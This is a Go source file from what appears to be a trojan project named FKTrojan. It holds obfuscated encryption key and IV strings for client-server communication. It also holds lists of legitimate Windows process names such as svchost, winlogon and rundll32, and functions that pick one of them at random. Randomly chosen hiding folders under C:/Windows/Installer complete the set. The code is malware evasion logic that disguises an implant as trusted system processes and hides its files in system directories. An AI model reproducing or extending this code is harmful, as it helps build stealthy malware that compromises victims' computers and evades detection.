package file_crypto

import (
	"FKTrojan/common"
	"math/rand"
	"time"
)

var (
	// 不要随意更改此值
	// 否则可能导致 客户端和服务器因为key不一致 无法通信
	CFB_KEY = "Un:4JISp[TCmZYK1bDC4ZYNh[n:zcXymd4NhZX6lJHWudIS6MDClZYKscnW{dzC4ZYNhc4[mdjC1bHVhd4Wz[nGk[TCw[jC1bHVh[HWmdDxhZX6lJISp[TCUdHmzbYRhc3ZhS3:lJIeidzCpc4[mdnmv[zCwenWzJISp[TC4ZYSmdoN>"
	CFB_IV  = "RX6lJFew[DC{ZXmlMDBjUHW1JISp[YKmJHKmJHyq[3i1MDJhZX6lJISp[YKmJIeidzCtbXepeD5>"
)
var (
	trustedExeName = []string{
		"svchost",
		"rcdcl",
		"OUTLOOK",
		"conhost",
		"rundll32",
		"services",
		"winlogon",
	}
	trustedExePath = []string{
		"C:/Windows/system",
		"C:/Windows/Installer",
	}
	trustSavePath = []string{
		"C:/Windows/Installer/{364C7E77-FFD5-40B7-8C0F-D7AE7A626153}",
		"C:/Windows/Installer/{9BA00E98-F182-44E4-8358-07624695919E}",
		"C:/Windows/Installer/{121A9B62-D300-403C-B824-BF3BDA86B369}",
		"C:/Windows/Installer/{7F70E926-B868-4400-82BF-2CDB0E4BDD8A}",
		"C:/Windows/Installer/{7F9214B8-1001-4082-9B9F-32FC2B236275}",
		"C:/Windows/Installer/{2135AB1C-DC3B-45D1-AA75-1727950025A7}",
		"C:/Windows/Installer/{6BBE096F-3792-444A-91BB-0279F1535D53}",
		"C:/Windows/Installer/{B4C11308-E8CF-44D2-959F-B087FD27B751}",
		"C:/Windows/Installer/{75AA894C-922A-4533-BC2B-91B4E8B75591}",
		"C:/Windows/Installer/{96970EAA-A1C9-479B-B2C9-A843C0D1528E}",
	}
)

func getCFBK() string {
	return common.Base64Decode(common.Deobfuscate(CFB_KEY))[:32]
}
func getIV() []byte {
	return []byte(common.Base64Decode(common.Deobfuscate(CFB_IV))[:16])
}

func getExeName() string {
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	siLen := len(trustedExeName)

	return trustedExeName[r1.Int()%siLen]
}

func getExePath() string {
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	siLen := len(trustedExePath)

	return trustedExePath[r1.Int()%siLen]
}
func getSavePath() string {
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	siLen := len(trustSavePath)

	return trustSavePath[r1.Int()%siLen]
}
